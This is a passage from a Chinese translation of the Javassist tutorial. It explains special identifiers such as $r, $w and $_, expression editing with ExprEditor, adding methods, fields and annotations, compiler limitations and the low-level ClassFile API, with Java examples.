($r)result;</span><br></pre></td></tr></table></figure><p>如果结果类型是一个基元类型，那么<code>($r)</code>遵循特殊的语义。首先，如果抛出表达式的操作数类型是基本类型，<code>($r)</code>就会作为一个普通的抛出操作数对结果类型进行操作。</p><p>另一方面，如果操作数类型是封装类型，<code>($r)</code>就会从封装类型转换到结果类型。例如，如果结果类型是int，那么<code>($r)</code>从java.lang.Integer转换为int。</p><p>如果结果类型是void，那么<code>($r)</code>不转换类型，它什么也不做。然而，如果操作数是对void方法的调用，那么($r)的结果是null。例如，如果结果类型是void，而foo()是一个void方法，则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_ = ($r)foo();</span><br></pre></td></tr></table></figure><h4 id="w"><a href="#w" class="headerlink" title="$w"></a><code>$w</code></h4><p><code>$w</code>代表一个封装类型。它必须在一个cast表达式中作为cast转换类型使用。($w)从一个基本类型转换到相应的封装类型。下面的代码是一个例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer i = ($w)<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>选择的封装类型取决于 ($w) 后面的表达式类型。如果表达式的类型是double，那么包装器类型就是java.lang.Double.。</p><p>如果<code>($w)</code>后面的表达式类型不是基本类型，那么($w)什么都不做。</p><h4 id="-1"><a href="#-1" class="headerlink" title="$_"></a><code>$_</code></h4><p>CtMethod和CtConstructor中的<code>insertAfter()</code>将编译后的代码插入到方法的最后。在给<code>insertAfter()</code>的语句中，不仅有上面所示的变量如<code>$0,$1</code>，还可以有<code>$_</code>。</p><p>变量<code>$_</code>表示方法的结果值。该变量的类型就是该方法的结果类型（返回类型）。如果结果类型是void，那么<code>$_</code>的类型是Object，<code>$_</code>的值是null。</p><p>虽然由insertAfter()插入的编译代码是在控件从方法中正常返回之前执行的，但它也可以在方法抛出异常时执行。<strong>为了在发生异常时执行它，<code>insertAfter()</code>的第二个参数asFinally必须为true。</strong></p><p>如果抛出异常，由<code>insertAfter()</code>插入的编译代码将作为最后子句执行。在编译后的代码中，<code>$_</code>的值为0或空。在编译代码执行终止后，原来抛出的异常会重新抛给调用者。注意，<code>$_</code>的值永远不会被抛给调用者，而是被丢弃。</p><h4 id="sig"><a href="#sig" class="headerlink" title="$sig"></a><code>$sig</code></h4><p>$sig的值是一个由java.lang.Class对象组成的数组，这些对象<strong>按照声明顺序表示形参类型</strong>。</p><h4 id="type"><a href="#type" class="headerlink" title="$type"></a><code>$type</code></h4><p>$type的值是一个java.lang.Class对象，代表结果值的类型。如果这是一个构造函数，那么这个变量是指Void.class。</p><h4 id="class"><a href="#class" class="headerlink" title="$class"></a><code>$class</code></h4><p><code>$class</code> 的值是一个 java.lang.Class 对象，代表声明编辑的方法所在的类。这代表了<code>$0</code>的类型。</p><h4 id="addCatch"><a href="#addCatch" class="headerlink" title="addCatch"></a><code>addCatch</code></h4><p><code>addCatch()</code>插入方法体抛出异常时执行的代码，控制权会返回给调用者。 在插入的源代码中，异常用 $e 表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtMethod m = ...;</span><br><span class="line">CtClass etype = ClassPool.getDefault().get(<span class="string">"java.io.IOException"</span>);</span><br><span class="line">m.addCatch(<span class="string">"&#123; System.out.println($e); throw $e; &#125;"</span>, etype);</span><br></pre></td></tr></table></figure><p>转换成对应的 java 代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// the original method body</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">    System.out.println(e);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，插入的代码片段必须以 throw 或 return 语句结束。</p><h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。<strong>它将新的源代码编译成 Java  字节码，并用它替换原方法体。</strong> 如果给定的源文本为 null，则替换后的方法体仅包含return语句，除非结果类型为 void，否则返回零或空值。</p><p>在传递给 setBody() 的源代码中，以 $ 开头的标识符具有特殊含义：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td><td><code>this</code> and 方法的参数</td></tr><tr><td><code>$args</code></td><td>方法参数数组.它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td></tr><tr><td><code>$cflow(</code>…<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p><code>$_</code>不可用。</p><h3 id="替换表达式"><a href="#替换表达式" class="headerlink" title="替换表达式"></a>替换表达式</h3><p>Javassist 只允许修改方法体中包含的表达式。</p><p>javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。</p><p>要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CtMethod cm = ... ;</span><br><span class="line">cm.instrument(</span><br><span class="line">    <span class="keyword">new</span> ExprEditor() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">edit</span><span class="params">(MethodCall m)</span> <span class="keyword">throws</span> CannotCompileException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (m.getClassName().equals(<span class="string">"Point"</span>)</span><br><span class="line">                          &amp;&amp; m.getMethodName().equals(<span class="string">"move"</span>))</span><br><span class="line">                m.replace(<span class="string">"&#123; $1 = 0; $_ = $proceed($$); &#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>上述代码，搜索由 cm 表示的方法体，并用使用下面的代码替换 Point 中的 move()调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; $<span class="number">1</span> = <span class="number">0</span>; $_ = $proceed($$); &#125;</span><br></pre></td></tr></table></figure><p>因此 move() 的第一个参数总是0。注意，替换的代码不是一个表达式，而是一个语句或块。 它不能是或包含 try-catch 语句。</p><p><strong>方法 instrument()搜索一个方法体。</strong>如果它找到了一个表达式，如方法调用、字段访问和对象创建，那么它就在<strong>给定的ExprEditor对象上调用edit()</strong>。<strong>edit()的参数是一个代表找到的表达式的对象</strong>。edit()方法可以通过该对象检查和替换该表达式。</p><p><strong>在edit()的参数上调用replace()，可以将给定的语句或块替换为表达式</strong>。如果给定的块是空块，也就是说，<strong>如果执行了replace(“{}”)，那么表达式就会从方法体中删除</strong>。如果你想在表达式之前/之后插入一条语句（或一个代码块），应该向 replace()传递一个类似下面的代码块，无论表达式是方法调用、字段访问、对象创建，还是其他：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; *before-statements;*  </span><br><span class="line">$_ = $proceed($$);  </span><br><span class="line">*after-statements;* &#125;</span><br></pre></td></tr></table></figure><p>当是write access写访问：</p><p><code>$_ = $proceed();</code></p><p>当是read access读访问：</p><p><code>$proceed($$);</code></p><h4 id="javassist-expr-MethodCall"><a href="#javassist-expr-MethodCall" class="headerlink" title="javassist.expr.MethodCall"></a>javassist.expr.MethodCall</h4><p>一个MethodCall对象代表一个方法调用。MethodCall中的方法replace()为方法调用替换了一条语句或一个代码块。它接收代表被替换的语句或代码块的源文本，其中以$开头的标识符具有特殊意义，就像传递给insertBefore()的源文本一样。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null</td></tr><tr><td><code>$1</code>, <code>$2</code> ..</td><td>方法的参数</td></tr><tr><td><code>$_</code></td><td>方法调用的结果</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$proceed</code></td><td>调用表达式中方法的名称</td></tr></tbody></table><p>这里的方法调用意味着由 MethodCall 对象表示的方法。</p><p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p><p>除非方法调用的返回类型为 void，否则返回值必须在源代码中赋给 <code>$_</code> ，<code>$_</code>的类型是表达式的结果类型。如果结果类型为 void，那么 <code>$_</code> 的值将被忽略。</p><p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p><h4 id="javassist-expr-ConstructorCall"><a href="#javassist-expr-ConstructorCall" class="headerlink" title="javassist.expr.ConstructorCall"></a>javassist.expr.ConstructorCall</h4><p>ConstructorCall 表示构造函数调用，例如包含在构造函数中的 this() 和 super()。<strong>ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。</strong>它接收表示替换语句或块的源代码。和 insertBefore() 方法一样，<strong>传递给 replace 的源代码中，</strong>以 $ 开头的标识符具有特殊的含义。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>构造调用的目标对象。它等于 this</td></tr><tr><td><code>$1</code>, <code>$2</code>, …</td><td>构造函数的参数</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$proceed</code></td><td>调用表达式中构造函数的名称</td></tr></tbody></table><p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p><p>由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。</p><p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p><h4 id="javassist-expr-FieldAccess"><a href="#javassist-expr-FieldAccess" class="headerlink" title="javassist.expr.FieldAccess"></a>javassist.expr.FieldAccess</h4><p>FieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。</p><h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p><h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p><h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p><h4 id="javassist-expr-Cast"><a href="#javassist-expr-Cast" class="headerlink" title="javassist.expr.Cast"></a>javassist.expr.Cast</h4><p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p><h4 id="javassist-expr-Handler"><a href="#javassist-expr-Handler" class="headerlink" title="javassist.expr.Handler"></a>javassist.expr.Handler</h4><p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p><h3 id="添加新方法和字段"><a href="#添加新方法和字段" class="headerlink" title="添加新方法和字段"></a>添加新方法和字段</h3><h4 id="添加新方法"><a href="#添加新方法" class="headerlink" title="添加新方法"></a>添加新方法</h4><p>Javassist 可以创建新的方法和构造函数。CtNewMethod 和 CtNewConstructor 提供了几个工厂方法来创建 CtMethod 或 CtConstructor 对象。make() 方法可以通过源代码来CtMethod 或 CtConstructor 对象。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int xmove(int dx) &#123; x += dx; &#125;"</span>,point);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure><p>上面的代码向类 Point 添加了一个公共方法 xmove()。在这个例子中，x 是类 Point 的一个int 字段。</p><p>传递给 make() 和 setBody() 的源文本可以包括以<code>$</code>开头的标识符（除了<code>$_</code>）。 如果目标对象和目标方法名也被传递给 make() 方法，源文本中也可以包括 <code>$proceed</code>。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int ymove(int dy) &#123; $proceed(0, dy); &#125;"</span>,</span><br><span class="line">                 point, <span class="string">"this"</span>, <span class="string">"move"</span>);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure><p>这个程序创建一个 ymove() 方法，定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ymove</span><span class="params">(<span class="keyword">int</span> dy)</span> </span>&#123; <span class="keyword">this</span>.move(<span class="number">0</span>, dy); &#125;</span><br></pre></td></tr></table></figure><p>注意，$proceed 已经被替换为 this.move。</p><p>Javassist 还提供了另一种添加新方法的方式。 你可以先创建一个抽象方法，然后给它一个方法体：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = <span class="keyword">new</span> CtMethod(CtClass.intType, <span class="string">"move"</span>,<span class="keyword">new</span> CtClass[] &#123; CtClass.intType &#125;, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">m.setBody(<span class="string">"&#123; x += $1; &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure><p>因为 Javassist 在类中添加了的方法是抽象的，所以在调用 setBody() 之后，必须将类显式地改回非抽象类（拥有方法体）。</p><h4 id="相互递归的方法"><a href="#相互递归的方法" class="headerlink" title="相互递归的方法"></a>相互递归的方法</h4><p>如果一个方法调用了另一个没有被添加到类中的方法，Javassist就不能编译该方法。</p><p>(<strong>但是Javassist 可以编译一个以递归方式调用自己的方法。</strong>)</p><p>要将相互递归的方法添加到一个类中，你需要一个如下所示的技巧。假设你想把方法m()和n()添加到一个由cc表示的类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public abstract int m(int i);"</span>, cc);</span><br><span class="line">CtMethod n = CtNewMethod.make(<span class="string">"public abstract int n(int i);"</span>, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">cc.addMethod(n);</span><br><span class="line">m.setBody(<span class="string">"&#123; return ($1 &lt;= 0) ? 1 : (n($1 - 1) * $1); &#125;"</span>);</span><br><span class="line">n.setBody(<span class="string">"&#123; return m($1); &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure><p>你必须先创建两个抽象方法，并将它们添加到类中。然后设置它们的方法体，即使方法体包括互相递归的调用。 最后，必须将类更改为非抽象类。</p><h4 id="添加一个字段"><a href="#添加一个字段" class="headerlink" title="添加一个字段"></a>添加一个字段</h4><p>Javassist 还允许用户创建一个新字段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);<span class="comment">//int z;</span></span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure><p>该程序向类 Point 添加一个名为 z 的字段。 <code>int z;</code><br>如果必须指定添加字段的初始值，那么上面的程序必须修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);</span><br><span class="line">point.addField(f, <span class="string">"0"</span>);  <span class="comment">// initial value is 0</span></span><br></pre></td></tr></table></figure><p><strong>总结：先声明再初始化。</strong></p><p>现在，方法 addField() 接收两个参数，第二个参数表示计算初始值的表达式。<strong>这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。</strong></p><p>此外，上述代码可以重写为更简单代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().<span class="keyword">get</span>(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public int z = 0;"</span>, point);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure><h4 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h4><p>要删除字段或方法，请在 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>CtClass，CtMethod，CtField 和 CtConstructor 提供 getAnnotations() 方法，用于读取注解。 它返回一个注解类型的对象。</p><p>例如，假设有以下注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Author &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">year</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是使用注解的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Author</span>(name=<span class="string">"Chiba"</span>, year=<span class="number">2005</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，可以使用 getAnnotations() 获取注解的值。 它返回一个包含注解类型对象的数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">Object[] all = cc.getAnnotations();</span><br><span class="line">Author a = (Author)all[<span class="number">0</span>];</span><br><span class="line">String name = a.name();</span><br><span class="line"><span class="keyword">int</span> year = a.year();</span><br><span class="line">System.out.println(<span class="string">"name: "</span> + name + <span class="string">", year: "</span> + year);</span><br></pre></td></tr></table></figure><p>这段代码输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name: Chiba, year: <span class="number">2005</span></span><br></pre></td></tr></table></figure><p>由于 Point 的注解只有 @Author，所以数组的长度是 1，all[0] 是一个 Author 对象。 注解成员值可以通过调用Author对象的 name() 和 year() 来获取。</p><p>要使用 getAnnotations()，注释类型（如 Author）必须包含在当前类路径中。它们也必须也可以从 ClassPool 对象访问。如果未找到注释类型的类文件，Javassist 将无法获取该注释类型的成员的默认值。</p><h3 id="运行时支持类"><a href="#运行时支持类" class="headerlink" title="运行时支持类"></a>运行时支持类</h3><p>在大多数情况下，使用 Javassist 修改类不需要运行 Javassist。 但是，Javassist 编译器生成的某些字节码需要运行时支持类，这些类位于 javassist.runtime 包中（有关详细信息，请阅读该包的API文档）。请注意，<strong>javassist.runtime 是修改的类时唯一可能需要使用的包</strong>。 修改类的运行时不会再使用其他的 Javassist 类。</p><h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><p>源代码中的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p><p><strong>要告诉编译器在解析类名时搜索其他包，请在 ClassPool中 调用 importPackage()</strong>。 例如，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">"java.awt"</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"Test"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public Point p;"</span>, cc);<span class="comment">//识别为java.awt.Point</span></span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure><p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 <strong>编译器可以将 Point 识别为java.awt.Point</strong>。</p><p> <strong>importPackage() 不会影响 ClassPool 中的 get() 方法</strong>。只有编译器才考虑导入包。 get() 的参数必须是完整类名。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>在目前实现中，Javassist 中包含的 Java 编译器有一些限制：</p><ul><li><p>J2SE 5.0 引入的新语法（包括枚举和泛型）不受支持。注释由 Javassist 的低级 API 支持。 参见 javassist.bytecode.annotation 包（以及 CtClass 和 CtBehavior 中的 getAnnotations()）。对泛型只提供部分支持。更多信息，请参阅<a href="http://www.javassist.org/tutorial/tutorial3.html#generics" target="_blank" rel="noopener">后面</a>的部分；</p></li><li><p>初始化数组时，只有一维数组可以用大括号加逗号分隔元素的形式初始化，多维数组还不支持；</p></li><li><p>编译器不能编译包含内部类和匿名类的源代码。 但是，Javassist 可以读取和修改内部/匿名类的类文件；</p></li><li><p>不支持带标记的 continue 和 break 语句；</p></li><li><p>编译器没有正确实现 Java 方法调度算法。编译器可能会混淆在类中定义的重载方法（方法名称相同，查参数列表不同）。例如：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(A a)</span> </span>&#123; .. &#125; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(B b)</span> </span>&#123; .. &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果编译的表达式是 <code>x.foo(new C())</code>，其中 <code>x</code> 是 <code>X</code> 的实例，编译器将产生对 <code>foo(A)</code> 的调用，尽管编译器可以正确地编译 <code>foo((B) new C())</code> 。</p><p><strong>建议使用 # 作为类名和静态方法或字段名之间的分隔符</strong>。 例如，在常规 Java 中：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javassist</span><span class="selector-class">.CtClass</span><span class="selector-class">.intType</span><span class="selector-class">.getName</span>()</span><br></pre></td></tr></table></figure><p>在 javassist.CtClass 中的静态字段 intType 指示的对象上调用一个方法 getName()。 在Javassist 中，用户也可以写上面的表达式，但是建议写成这样：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javassist.CtClass#intType.getName()</span><br></pre></td></tr></table></figure><p>可以使编译器可以快速解析表达式。</p><h2 id="字节码级API"><a href="#字节码级API" class="headerlink" title="字节码级API"></a>字节码级API</h2><p>Javassist 还提供了用于直接编辑类文件的低级级 API。 使用此 API之前，你需要详细了解Java 字节码和类文件格式，因为它允许你对类文件进行任意修改。</p><p>如果你只想生成一个简单的类文件，使用<code>javassist.bytecode.ClassFileWriter</code>就足够了。 它比<code>javassist.bytecode.ClassFile</code>更快而且更小。</p><h3 id="获取ClassFile对象"><a href="#获取ClassFile对象" class="headerlink" title="获取ClassFile对象"></a>获取ClassFile对象</h3><p>javassist.bytecode.ClassFile 对象表示类文件。要获得这个对象，<strong>应该调用 CtClass 中的 <code>getClassFile()</code> 方法</strong>。你<strong>也可以直接从类文件构造 javassist.bytecode.ClassFile 对象</strong>。 例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream fin</span><br><span class="line">    = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"Point.class"</span>));</span><br><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">new</span> DataInputStream(fin));</span><br></pre></td></tr></table></figure><p>这代码段从 Point.class 创建一个 ClassFile 对象。</p><p>ClassFile 对象可以写回类文件。</p><p>ClassFile 的 write() 将类文件的内容写入给定的 DataOutputStream。</p><p>也可以从头开始创建一个类文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">false</span>, <span class="string">"test.Foo"</span>, <span class="keyword">null</span>);</span><br><span class="line">cf.setInterfaces(<span class="keyword">new</span> String[] &#123; <span class="string">"java.lang.Cloneable"</span> &#125;);  </span><br><span class="line">FieldInfo f = <span class="keyword">new</span> FieldInfo(cf.getConstPool(), <span class="string">"width"</span>, <span class="string">"I"</span>); f.setAccessFlags(AccessFlag.PUBLIC); </span><br><span class="line">cf.addField(f); </span><br><span class="line">cf.write(<span class="keyword">new</span> DataOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"Foo.class"</span>)));</span><br></pre></td></tr></table></figure><p>这段代码生成了一个类文件Foo.class，实现结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> width; 